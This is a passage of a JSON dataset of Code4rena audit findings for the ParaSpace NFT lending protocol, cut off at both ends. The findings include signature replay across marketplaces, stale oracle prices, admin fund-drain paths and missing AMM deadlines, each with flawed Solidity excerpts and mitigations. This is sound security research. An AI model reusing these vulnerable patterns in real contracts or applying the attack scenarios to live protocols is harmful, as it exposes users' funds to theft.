balanceOf function, as this type of PToken is supposed to reflect the user's current balance in ape staking. \n\nWhen user unstakes their ape tokens through executeUnstakePositionAndRepay, they will receive their fair share of rewards.It will call ApeCoinStaking's \\_withdrawPairNft which will claim rewards also for BAKC tokens. However, because balanceOf() shows a lower value, the rewards not count as collateral for user's debt, which is a major issue for lending platforms.\n\n## Impact\n\nRewards are not accounted for properly in NTokenApeStaking contracts, limiting user's collateral.\n\n## Tools Used\n\nManual audit\n\n## Recommended Mitigation Steps\n\nBalance calculation should include pendingRewards from BAKC tokens if they exist.",
      "summary": "\nThis bug report is about a vulnerability in the ApeStakingLogic.sol contract, which is part of the Paraspace protocol. The bug is related to the `getTokenIdStakingAmount()` function, which is used to get the stake amount for a specific BAYC / MAYC NFT. The function does not include the pendingRewards for the BAKC token paired to the direct NFT, resulting in the total returned amount being lower than the correct user balance. This affects the balanceOf function in the PTokenSApe.sol contract, which is used to reflect the user's current balance in ape staking.\n\nThe impact of this bug is that rewards are not accounted for properly in NTokenApeStaking contracts, limiting user's collateral. The bug was discovered through manual audit.\n\nThe recommended mitigation steps for this bug are to make sure that the balance calculation includes pendingRewards from BAKC tokens if they exist.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "https://github.com/code-423n4/2022-11-paraspace-findings/issues/481",
      "tags": [],
      "finders": [
        "0x52  ladboy233",
        "Trust"
      ]
    },
    {
      "id": "16001",
      "title": "[M-18] Bad debt will likely incur when multiple NFTs are liquidated",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/protocol/libraries/logic/GenericLogic.sol#L394>\n\n\\_getUserBalanceForERC721() in GenericLogic gets the value of a user's specific ERC721 xToken. It is later used for determining the account's health factor. In case `isAtomicPrice` is false such as in ape NTokens, price is calculated using:\n\n        uint256 assetPrice = _getAssetPrice(\n            params.oracle,\n            vars.currentReserveAddress\n        );\n        totalValue =\n            ICollateralizableERC721(vars.xTokenAddress)\n                .collateralizedBalanceOf(params.user) *\n            assetPrice;\n\nIt is the number of apes multiplied by the floor price returns from \\_getAssetPrice. The issue is that this calculation does not account for slippage, and is unrealistic. If user's account is liquidated, it is very unlikely that releasing several multiples of precious NFTs will not bring the price down in some significant way.\n\nBy performing simple multiplication of NFT count and NFT price, protocol is introducing major bad debt risks and is not as conservative as it aims to be. Collateral value must take slippage risks into account.\n\n### Impact\n\nBad debt will likely incur when multiple NFTs are liquidated.\n\n### Recommended Mitigation Steps\n\nChange the calculation to account for slippage when NFT balance is above some threshold.\n\n**[WalidOfNow (Paraspace) commented](https://github.com/code-423n4/2022-11-paraspace-findings/issues/479#issuecomment-1404057265):**\n > There's no real issue here. Its pretty much saying that the design of the protocol is not good for certain market behaviours. This is more of a suggestion than an issue. On top of that, we actually account for this slippage by choosing low LTV and LT.\n\n**[Trust (warden) commented](https://github.com/code-423n4/2022-11-paraspace-findings/issues/479#issuecomment-1404106418):**\n > Regardless of the way we look at it, I've established assets are at risk under stated conditions which are not correctly taken into account in the protocol. That seems to meet the bar set for Medium level submissions.\n\n\n\n***\n\n",
      "summary": "\nA bug has been identified in the code of the GenericLogic smart contract, which is part of the Paraspace protocol. This bug affects the calculation of the user's balance for ERC721 xTokens. The bug is caused by the fact that the calculation does not take slippage into account. This means that when multiple NFTs are liquidated, bad debt will likely incur. The manual audit was used to identify this bug. To mitigate this issue, the calculation should be changed to account for slippage when the NFT balance is above a certain threshold.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "https://github.com/code-423n4/2022-11-paraspace-findings/issues/479",
      "tags": [],
      "finders": [
        "Trust"
      ]
    },
    {
      "id": "16000",
      "title": "[M-17] Attacker can abuse victims signature for marketplace bid to buy worthless item",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/protocol/libraries/types/DataTypes.sol#L296\n\n\n## Vulnerability details\n\n\n## Description\n\nIn ParaSpace marketplace, taker may pass maker's signature and fulfil their bid with taker's NFT. The maker can use credit loan to purchase the NFT provided the health factor is positive in the end.\n\nIn validateAcceptBidWithCredit, verifyCreditSignature  is called to verify maker signed the credit structure.\n\n```\nfunction verifyCreditSignature(\n    DataTypes.Credit memory credit,\n    address signer,\n    uint8 v,\n    bytes32 r,\n    bytes32 s\n) private view returns (bool) {\n    return\n        SignatureChecker.verify(\n            hashCredit(credit),\n            signer,\n            v,\n            r,\n            s,\n            getDomainSeparator()\n        );\n}\n```\n\nThe issue is that the credit structure does not have a marketplace identifier:\n```\nstruct Credit {\n    address token;\n    uint256 amount;\n    bytes orderId;\n    uint8 v;\n    bytes32 r;\n    bytes32 s;\n}\n```\n\nAs a result, attacker can use the victim's signature for some orderId in a particular marketplace for another one, where this orderId leads to a much lower valued item.\nUser would borrow money to buy victim's valueless item. This would be HIGH impact, but incidentally right now only the SeaportAdapter marketplace supports credit loans to maker (implements matchBidWithTakerAsk). However, it is very likely the supporting code will be added to LooksRareAdapter and X2Y2Adapter as well. \nLooksRareExchange supports the function out of the box:\n\n```\nfunction matchBidWithTakerAsk(OrderTypes.TakerOrder calldata takerAsk, OrderTypes.MakerOrder calldata makerBid)\n    external\n    override\n    nonReentrant\n{\n    require((!makerBid.isOrderAsk) && (takerAsk.isOrderAsk), \"Order: Wrong sides\");\n    require(msg.sender == takerAsk.taker, \"Order: Taker must be the sender\");\n    // Check the maker bid order\n    bytes32 bidHash = makerBid.hash();\n    _validateOrder(makerBid, bidHash);\n    (bool isExecutionValid, uint256 tokenId, uint256 amount) = IExecutionStrategy(makerBid.strategy)\n        .canExecuteTakerAsk(takerAsk, makerBid);\n    require(isExecutionValid, \"Strategy: Execution invalid\");\n    // Update maker bid order status to true (prevents replay)\n    _isUserOrderNonceExecutedOrCancelled[makerBid.signer][makerBid.nonce] = true;\n    // Execution part 1/2\n    ...\n}\n```\n\nSo, this impact would be HIGH but since it is currently not implemented, would downgrade to MED. I understand it can be closed as OOS due to speculation of future code, however I would ask to consider that the likelihood of other Exchanges supporting the required API is particularly high, and take into account the value of this contribution.\n\n## Impact\n\nAttacker can abuse victim's signature for marketplace bid to buy worthless item\n\n\n## Tools Used\n\nManual audit\n\n## Recommended Mitigation Steps\n\nCredit structure should contain an additional field \"MarketplaceAddress\"",
      "summary": "\nThis bug report is about an issue in ParaSpace marketplace, which allows a taker to pass a maker's signature and use it to fulfil their bid with taker's NFT. The maker can use credit loan to purchase the NFT provided the health factor is positive in the end.\n\nThe issue is that the credit structure does not have a marketplace identifier, which means that an attacker can use the victim's signature for some orderId in a particular marketplace for another one, where this orderId leads to a much lower valued item. This would allow the attacker to borrow money to buy victim's valueless item, which would have a high impact.\n\nThe bug was discovered through manual audit. The recommended mitigation step is to add an additional field \"MarketplaceAddress\" to the credit structure.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "https://github.com/code-423n4/2022-11-paraspace-findings/issues/475",
      "tags": [],
      "finders": [
        "Trust"
      ]
    },
    {
      "id": "15999",
      "title": "[M-16] When users sign a credit loan for bidding on an item, they are forever committed to the loan even if the NFT value drops massively",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/protocol/libraries/types/DataTypes.sol#L296>\n\nIn ParaSpace marketplace, taker may pass maker's signature and fulfil their bid with taker's NFT. The maker can use credit loan to purchase the NFT provided the health factor is positive in the end.\n\nIn validateAcceptBidWithCredit, verifyCreditSignature  is called to verify maker signed the credit structure.\n\n    function verifyCreditSignature(\n        DataTypes.Credit memory credit,\n        address signer,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) private view returns (bool) {\n        return\n            SignatureChecker.verify(\n                hashCredit(credit),\n                signer,\n                v,\n                r,\n                s,\n                getDomainSeparator()\n            );\n    }\n\nThe issue is that the credit structure does not have a deadline:\n\n    struct Credit {\n        address token;\n        uint256 amount;\n        bytes orderId;\n        uint8 v;\n        bytes32 r;\n        bytes32 s;\n    }\n\nAs a result, attacker may simply wait and if the price of the NFT goes down abuse their previous signature to take a larger amount than they would like to pay for the NFT. Additionaly, there is no revocation mechanism, so user has completely committed to loan to get the NFT until the end of time.\n\n### Impact\n\nWhen users sign a credit loan for bidding on an item, they are forever committed to the loan even if the NFT value drops massively.\n\n### Recommended Mitigation Steps\n\nAdd a deadline timestamp to the signed credit structure.\n\n\n\n***\n\n",
      "summary": "\nA bug has been identified in the ParaSpace marketplace, where a taker can pass a maker's signature and fulfill their bid with the taker's NFT using credit loan. The bug is that the credit structure does not have a deadline, meaning that an attacker can wait and abuse their previous signature to take a larger amount than they would like to pay for the NFT. This leaves the user committed to the loan until the end of time, as there is no revocation mechanism. This bug was discovered through manual audit. \n\nThe impact of this bug is that users signing a credit loan for bidding on an item are forever committed to the loan even if the NFT value drops massively. To mitigate this issue, it is recommended that a deadline timestamp be added to the signed credit structure.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "https://github.com/code-423n4/2022-11-paraspace-findings/issues/474",
      "tags": [],
      "finders": [
        "Trust"
      ]
    },
    {
      "id": "15998",
      "title": "[M-15] NFTFloorOracles assets will use old prices if added back after removal",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/NFTFloorOracle.sol#L296-L305\n\n\n## Vulnerability details\n\n`assetFeederMap` mapping has elements of the `FeederRegistrar` structure type, that contains nested `feederPrice` mapping. When an asset is being removed with _removeAsset(), its `assetFeederMap` entry is deleted with the plain `delete assetFeederMap[_asset]` operation, which leaves `feederPrice` mapping intact.\n\nThis way if the asset be added back after removal its old prices will be reused via _combine() given that their timestamps are fresh enough and the corresponding feeders stay active.\n\n## Impact\n\nOld prices can be irrelevant in the big enough share of cases. The asset can be removed due to its internal issues that are usually coupled with price disruptions, so it is reasonable to assume that recent prices of a removed asset can be corrupted for the same reason that caused its removal.\n\nNevertheless these prices will be used as if they were added for this asset after its return. Recency logic will work as usual, so the issue is conditional on `config.expirationPeriod` being substantial enough, which might be the case for all illiquid assets.\n\nNet impact is incorrect valuation of the corresponding NFTs, that can lead to the liquidation of the healthy accounts, which is the permanent loss of the principal funds for their owners. However, due to prerequisites placing the severity to be medium.\n\n## Proof of Concept\n\n_removeAsset() will `delete` the `assetFeederMap` entry, setting its elements to zero:\n\nhttps://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/NFTFloorOracle.sol#L296-L305\n\n```solidity\n    function _removeAsset(address _asset)\n        internal\n        onlyWhenAssetExisted(_asset)\n    {\n        uint8 assetIndex = assetFeederMap[_asset].index;\n        delete assets[assetIndex];\n        delete assetPriceMap[_asset];\n        delete assetFeederMap[_asset];\n        emit AssetRemoved(_asset);\n    }\n```\n\nNotice, that `assetFeederMap` is the mapping with `FeederRegistrar` elements:\n\nhttps://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/NFTFloorOracle.sol#L86-L88\n\n```solidity\n    /// @dev Original raw value to aggregate with\n    // the NFT contract address -> FeederRegistrar which contains price from each feeder\n    mapping(address => FeederRegistrar) public assetFeederMap;\n```\n\n`FeederRegistrar` is a structure with a nested `feederPrice` mapping.\n\n`feederPrice` nested mapping will not be deleted with `delete assetFeederMap[_asset]`:\n\nhttps://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/NFTFloorOracle.sol#L32-L41\n\n```solidity\nstruct FeederRegistrar {\n    // if asset registered or not\n    bool registered;\n    // index in asset list\n    uint8 index;\n    // if asset paused,reject the price\n    bool paused;\n    // feeder -> PriceInformation\n    mapping(address => PriceInformation) feederPrice;\n}\n```\n\nPer operation docs `So if you delete a struct, it will reset all members that are not mappings and also recurse into the members unless they are mappings`:\n\nhttps://docs.soliditylang.org/en/latest/types.html#delete\n\nThis way, if the asset be added back its `feederPrice` mapping will be reused.\n\nOn addition of this old `_asset` only its `assetFeederMap[_asset].index` be renewed:\n\nhttps://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/NFTFloorOracle.sol#L278-L286\n\n```solidity\n    function _addAsset(address _asset)\n        internal\n        onlyWhenAssetNotExisted(_asset)\n    {\n        assetFeederMap[_asset].registered = true;\n        assets.push(_asset);\n        assetFeederMap[_asset].index = uint8(assets.length - 1);\n        emit AssetAdded(_asset);\n    }\n```\n\nThis means that the old prices will be immediately used for price construction, given that `config.expirationPeriod` is big enough:\n\nhttps://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/NFTFloorOracle.sol#L397-L430\n\n```solidity\n    function _combine(address _asset, uint256 _twap)\n        internal\n        view\n        returns (bool, uint256)\n    {\n        FeederRegistrar storage feederRegistrar = assetFeederMap[_asset];\n        uint256 currentBlock = block.number;\n        //first time just use the feeding value\n        if (assetPriceMap[_asset].twap == 0) {\n            return (true, _twap);\n        }\n        //use memory here so allocate with maximum length\n        uint256 feederSize = feeders.length;\n        uint256[] memory validPriceList = new uint256[](feederSize);\n        uint256 validNum = 0;\n        //aggeregate with price from all feeders\n        for (uint256 i = 0; i < feederSize; i++) {\n            PriceInformation memory priceInfo = feederRegistrar.feederPrice[\n                feeders[i]\n            ];\n            if (priceInfo.updatedAt > 0) {\n                uint256 diffBlock = currentBlock - priceInfo.updatedAt;\n                if (diffBlock <= config.expirationPeriod) {\n                    validPriceList[validNum] = priceInfo.twap;\n                    validNum++;\n                }\n            }\n        }\n        if (validNum < MIN_ORACLES_NUM) {\n            return (false, assetPriceMap[_asset].twap);\n        }\n        _quickSort(validPriceList, 0, int256(validNum - 1));\n        return (true, validPriceList[validNum / 2]);\n    }\n```\n\n## Recommended Mitigation Steps\n\nConsider clearing the current list of prices on asset removal, for example:\n\nhttps://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/NFTFloorOracle.sol#L296-L305\n\n```solidity\n    function _removeAsset(address _asset)\n        internal\n        onlyWhenAssetExisted(_asset)\n    {\n+       FeederRegistrar storage feederRegistrar = assetFeederMap[_asset];\n+       uint256 feederSize = feeders.length;\n+       for (uint256 i = 0; i < feederSize; i++) {\n+           delete feederRegistrar.feederPrice[feeders[i]];\n+       }\n        uint8 assetIndex = feederRegistrar.index;\n        delete assets[assetIndex];\n        delete assetPriceMap[_asset];\n        delete assetFeederMap[_asset];\n        emit AssetRemoved(_asset);\n    }\n```",
      "summary": "\nThis bug report is about an issue in the NFTFloorOracle.sol smart contract. The issue happens when an asset is removed with the _removeAsset() operation, which leaves the `feederPrice` mapping intact. This means that if the asset is added back, its old prices will be reused via _combine() given that their timestamps are fresh enough and the corresponding feeders stay active. This could lead to incorrect valuation of the corresponding NFTs, which can result in the liquidation of healthy accounts and the permanent loss of the principal funds for their owners.\n\nThe recommended mitigation step is to consider clearing the current list of prices on asset removal. This can be done by adding a few lines of code to the _removeAsset() operation, which will delete the `feederPrice` mapping. This will ensure that the old prices are not reused and the NFTs are correctly valued.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "https://github.com/code-423n4/2022-11-paraspace-findings/issues/459",
      "tags": [],
      "finders": [
        "hyh",
        "Trust",
        "SmartSek",
        "kaliberpoziomka8552"
      ]
    },
    {
      "id": "15997",
      "title": "[M-14] Centralization Risks",
      "impact": "MEDIUM",
      "content": "\n***Note: per discussion with the judge, instead of highlighting only one submission related to centralization risks, all related findings are being compiled together under M-14 to provide a more complete report.***\n\n### [**1. The calculateAuctionPriceMultiplier() function is not properly implemented**](https://github.com/code-423n4/2022-11-paraspace-findings/issues/125)\n\nThe `_calculateAuctionPriceMultiplierByTicks()` function is not properly implemented, it will revert when `_maxPriceMultiplier < 1e18` or `_minExpPriceMultiplier < 1e18`, causes `executeLiquidateERC721()` not working. If the owner sets either of these numbers incorrectly, auctions will revert and the protocol will lose a lot of money.\n\n### [**2. Uniswap v3 LP token might be auctionable**](https://github.com/code-423n4/2022-11-paraspace-findings/issues/287)\n\nThe protocol determines whether an asset type can be auctioned purely by checking if the `auctionStrategyAddress` is configured. If the `auctionStrategyAddress` of an asset is configured, then it can be auctioned. \n\nHowever, upon inspecting the code, it was observed that the initialization function (`ReserveLogic.init`) and `PoolParameters.setReserveAuctionStrategyAddress` do not have any mechanism to prevent the admin from configuring the `auctionStrategyAddress` of the Uniswap v3 LP token. Thus, it is possible that the admin accidentally configures the `auctionStrategyAddress` of the Uniswap v3 LP token, and this results in Uniswap v3 LP token being auctionable.\n\n### [**3. poolAdmin can withdraw all underlying asset balance of NTokens by using executeAirdrop() function**](https://github.com/code-423n4/2022-11-paraspace-findings/issues/211)\n*Duplicates: [199](https://github.com/code-423n4/2022-11-paraspace-findings/issues/199), [234](https://github.com/code-423n4/2022-11-paraspace-findings/issues/234), [485](https://github.com/code-423n4/2022-11-paraspace-findings/issues/485), [488](https://github.com/code-423n4/2022-11-paraspace-findings/issues/488)*\n\neach NToken contract holds all the users collaterals for specific underlying asset. poolAdmin is the admin of the pool and have some accesses but he/she shouldn't be able to withdraw and transfer users funds(the underlying asset). in the functions `rescueERC721()` which is only callable by poolAdmin, there is a check that make sures admin can't transfer underlying asset but in the function `executeAirdrop()` there is no checks. function `executeAirdrop()` make a external call with admin specified address, function, parameters. admin can set parameters so the logic would call `underlyingAsset.safeTransferFrom(NToken, destAdderss, tokenId)` or `underlyingAsset.setApprovalForAll(destAddress, true)` and then admin could transfer all the underlying assets which belongs to users. this is critical issue because all the protocol collaterals are in danger if poolAdmin private key get compromised.\n\n### [**4. A single point of failure can allow a hacked or malicious owner to use critical functions in the project**](https://github.com/code-423n4/2022-11-paraspace-findings/issues/70)\n*Duplicates: [248](https://github.com/code-423n4/2022-11-paraspace-findings/issues/248), [272](https://github.com/code-423n4/2022-11-paraspace-findings/issues/272), [437](https://github.com/code-423n4/2022-11-paraspace-findings/issues/437), [477](https://github.com/code-423n4/2022-11-paraspace-findings/issues/477), [521](https://github.com/code-423n4/2022-11-paraspace-findings/issues/521)*\n\nThe `owner` role has a single point of failure and `onlyOwner` can use a few critical functions.\n\n`owner` role in the paraspace project:<br>\nOwner is not behind a multisig and changes are not behind a timelock. There is no clear definition of the `owner` in the paraspace docs.\n\nEven if protocol admins/developers are not malicious there is still a chance for Owner keys to be stolen. In such a case, the attacker can cause serious damage to the project due to important functions. In such a case, users who have invested in project will suffer high financial losses.\n\n### [**5. NFTFloorOracle: setPrice can lead to user nft lost, or protocol drain of funds due to lack of check of constraints established in documentation and code**](https://github.com/code-423n4/2022-11-paraspace-findings/issues/251)\n*Duplicates: [29](https://github.com/code-423n4/2022-11-paraspace-findings/issues/29), [30](https://github.com/code-423n4/2022-11-paraspace-findings/issues/30), [54](https://github.com/code-423n4/2022-11-paraspace-findings/issues/54), [59](https://github.com/code-423n4/2022-11-paraspace-findings/issues/59), [86](https://github.com/code-423n4/2022-11-paraspace-findings/issues/86), [359](https://github.com/code-423n4/2022-11-paraspace-findings/issues/359), [375](https://github.com/code-423n4/2022-11-paraspace-findings/issues/375), [410](https://github.com/code-423n4/2022-11-paraspace-findings/issues/410), [433](https://github.com/code-423n4/2022-11-paraspace-findings/issues/433), [437](https://github.com/code-423n4/2022-11-paraspace-findings/issues/437), [441](https://github.com/code-423n4/2022-11-paraspace-findings/issues/441), [450](https://github.com/code-423n4/2022-11-paraspace-findings/issues/450), [473](https://github.com/code-423n4/2022-11-paraspace-findings/issues/473), [521](https://github.com/code-423n4/2022-11-paraspace-findings/issues/521)*\n\n-   Centralization risk: Admin can bypass all security measures established in documentation, allowing they to drain all protocol funds if they buy an accepted NFT as collateral and then set it floor price to max value possible\n-   Admin can set current TWAP to zero, leading to user lose of NFTs due to liquidation.\n-   Allows feeder to eventually inform any price if they set _twap to zero\n\n### [**6. Pool admin can steal underlying of a NToken**](https://github.com/code-423n4/2022-11-paraspace-findings/issues/452)\n*Duplicates: [236](https://github.com/code-423n4/2022-11-paraspace-findings/issues/236), [296](https://github.com/code-423n4/2022-11-paraspace-findings/issues/296), [437](https://github.com/code-423n4/2022-11-paraspace-findings/issues/437), [513](https://github.com/code-423n4/2022-11-paraspace-findings/issues/513)*\n\nThe admin can:\n\n- steal ERC20 assets calling rescueERC20() from NToken.sol \n- steal ERC1155 assets calling rescueERC1155() from NToken.sol \n- steal ERC721 assets calling rescueERC721() from NToken.sol \n\n### [**7. Owner can change implementation of various contracts**](https://github.com/code-423n4/2022-11-paraspace-findings/issues/347)\n*Duplicates: [516](https://github.com/code-423n4/2022-11-paraspace-findings/issues/516)*\n\nThe owner can update the implementation of various contracts, allowing theft of assets and general compromise of the protocol.\n\nOne example:<br>\nThe owner of the PoolAddressProvider.sol contract can update the implementation of Pool contract by calling updatePoolImpl function.\n\nThe contract provides an easy way to add new functions using IParaProxy.ProxyImplementationAction.Add enum. This way a malicious user can add a malicious function in the Pool contract which can be used to steal tokens from other contracts which rely on the onlyPool modifier for their checks.\n\n### [**8. Owner can renounce while system is paused**](https://github.com/code-423n4/2022-11-paraspace-findings/issues/521)\n\nThe contract owner or single user with a role is not prevented from renouncing the role/ownership while the contract is paused, which would cause any user assets stored in the protocol, to be locked indefinitely\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about the centralization risks of the Paraspace protocol. It was submitted by multiple users, and it highlights several issues related to the protocol. \n\nThe first issue is that the calculateAuctionPriceMultiplier() function is not properly implemented and will revert when either _maxPriceMultiplier or _minExpPriceMultiplier is less than 1e18. This causes the executeLiquidateERC721() function not to work, resulting in the protocol losing a lot of money. \n\nThe second issue is that Uniswap v3 LP token might be auctionable. The protocol determines if an asset type can be auctioned by checking if the auctionStrategyAddress is configured. However, there is no mechanism to prevent the admin from configuring the auctionStrategyAddress of the Uniswap v3 LP token, which might result in it being auctionable. \n\nThe third issue is that poolAdmin can withdraw all underlying asset balance of NTokens by using executeAirdrop() function. Each NToken contract holds all the users collaterals for a specific underlying asset, and poolAdmin is the admin of the pool. However, poolAdmin should not be able to withdraw and transfer users funds (the underlying asset). The rescueERC721() function, which is only callable by poolAdmin, has a check that makes sure the admin can't transfer the underlying asset, but this check is not sufficient.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "#m-14-centralization-risks",
      "tags": [],
      "finders": [
        "ladboy233",
        "xiaoming90",
        "BClabs",
        "jadezti",
        "Trust",
        "pashov",
        "minhquanym",
        "Saintcode_",
        "gz627",
        "ahmedov",
        "Lambda",
        "KingNFT",
        "Mukund",
        "Josiah",
        "csanuragjain",
        "IllIllI",
        "fs0c",
        "hihen",
        "nicobevi",
        "RaymondFam",
        "wait",
        "SmartSek",
        "imare",
        "9svR6w",
        "Rolezn",
        "gzeon",
        "carlitox477",
        "unforgiven"
      ]
    },
    {
      "id": "15996",
      "title": "[M-13] Interactions with AMMs do not use deadlines for operations",
      "impact": "MEDIUM",
      "content": "\nFrom a judge's comment in a previous [contest](https://code4rena.com/reports/2022-06-canto-v2/#m-01-stableswap---deadline-do-not-work):\n\n```md\nBecause Front-running is a key aspect of AMM design, deadline is a useful tool to ensure that your tx cannot be saved for later.\n\nDue to the removal of the check, it may be more profitable for a miner to deny the transaction from being mined until the transaction incurs the maximum amount of slippage.\n```\n\nMost of the functions that interact with AMM pools do not have a deadline parameter, but specifically the one shown below is passing `block.timestamp` to a pool, which means that whenever the miner decides to include the txn in a block, it will be valid at that time, since `block.timestamp` will *be* the current timestamp.\n\n### Proof of Concept\n\n```solidity\nFile: /paraspace-core/contracts/protocol/tokenization/NTokenUniswapV3.sol   #1\n\n51       function _decreaseLiquidity(\n52           address user,\n53           uint256 tokenId,\n54           uint128 liquidityDecrease,\n55           uint256 amount0Min,\n56           uint256 amount1Min,\n57           bool receiveEthAsWeth\n58       ) internal returns (uint256 amount0, uint256 amount1) {\n59           if (liquidityDecrease > 0) {\n60               // amount0Min and amount1Min are price slippage checks\n61               // if the amount received after burning is not greater than these minimums, transaction will fail\n62               INonfungiblePositionManager.DecreaseLiquidityParams\n63                   memory params = INonfungiblePositionManager\n64                       .DecreaseLiquidityParams({\n65                           tokenId: tokenId,\n66                           liquidity: liquidityDecrease,\n67                           amount0Min: amount0Min,\n68                           amount1Min: amount1Min,\n69 @>                        deadline: block.timestamp\n70                       });\n71   \n72               INonfungiblePositionManager(_underlyingAsset).decreaseLiquidity(\n73                   params\n74               );\n75           }\n76:  \n```\n\n<https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/protocol/tokenization/NTokenUniswapV3.sol#L51-L76>\n\nA malicious miner can hold the transaction, which may be being done in order to free up capital to ensure that there are funds available to do operations to prevent a liquidation. It is highly likely that a liquidation is more profitable for a miner to mine, with its associated follow-on transactions, than to allow the decrease of liquidity. A miner can also just hold it until maximum slippage is incurred, as the judge stated.\n\n### Recommended Mitigation Steps\n\nAdd deadline arguments to all functions that interact with AMMs, and pass it along to AMM calls.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the code of a decentralized application (dApp) called ParaSpace. It is related to the \"DecreaseLiquidity\" function, which is used to reduce the liquidity of a token in an automated market maker (AMM) pool. The bug is that the function is passing the \"block.timestamp\" parameter to the pool, which means that whenever the miner decides to include the transaction in a block, it will be valid at that time. This could lead to a situation where a malicious miner holds the transaction, which may be done in order to free up capital to prevent a liquidation. It is also possible that a miner might wait until maximum slippage is incurred. The recommended mitigation step is to add deadline arguments to all functions that interact with AMMs, and pass it along to AMM calls.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "https://github.com/code-423n4/2022-11-paraspace-findings/issues/429",
      "tags": [],
      "finders": [
        "IllIllI"
      ]
    },
    {
      "id": "15995",
      "title": "[M-12] During oracle outages or feeder outages/disagreement, the ParaSpaceFallbackOracle is not used",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/ParaSpaceOracle.sol#L114-L136\n\n\n## Vulnerability details\n\n## Impact\nIf the feeders haven't updated their prices within the default six-hour time window, the floor oracle will revert when requests are made to get the current price, and these reverts are not caught by the wrapper oracle which handles the fallback oracle, so rather than using the fallback oracle in these cases, the calls will revert, leading to liquidations to fail (see my other submission for the full chain from the floor oracle to the liquidation function).\n\nAdditionally, the code uses the deprecated chainlink `latestAnswer()` API for its token requests, which may revert once it is no longer supported\n\n## Proof of Concept\n`getPrice()` will fail if the values are stale:\n```solidity\nFile: /paraspace-core/contracts/misc/NFTFloorOracle.sol   #1\n\n236      function getPrice(address _asset)\n237          external\n238          view\n239          override\n240          returns (uint256 price)\n241      {\n242 @>       uint256 updatedAt = assetPriceMap[_asset].updatedAt;\n243          require(\n244              (block.number - updatedAt) <= config.expirationPeriod,\n245 @>           \"NFTOracle: asset price expired\"\n246          );\n247          return assetPriceMap[_asset].twap;\n248:     }\n```\nhttps://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/NFTFloorOracle.sol#L236-L248\n\nThey can be stale due to too much price skew, or the feeders being down, e.g. due to another bug:\n```solidity\nFile: /paraspace-core/contracts/misc/NFTFloorOracle.sol   #2\n\n369          // config maxPriceDeviation as multiple directly(not percent) for simplicity\n370          if (priceDeviation >= config.maxPriceDeviation) {\n371              return false;\n372:         }\n```\nhttps://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/NFTFloorOracle.sol#L369-L372\n\n```solidity\nFile: /paraspace-core/contracts/misc/NFTFloorOracle.sol   #3\n\n376      function _finalizePrice(address _asset, uint256 _twap) internal {\n377          PriceInformation storage assetPriceMapEntry = assetPriceMap[_asset];\n378          assetPriceMapEntry.twap = _twap;\n379 @>       assetPriceMapEntry.updatedAt = block.number;\n380          assetPriceMapEntry.updatedTimestamp = block.timestamp;\n381          emit AssetDataSet(\n382              _asset,\n383              assetPriceMapEntry.twap,\n384              assetPriceMapEntry.updatedAt\n385          );\n386:     }\n```\nhttps://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/NFTFloorOracle.sol#L376-L386\n\nThe wrapper oracle does not use a try-catch, so it can't swallow these reverts and allow the fallback oracle to be used:\n```solidity\nFile: 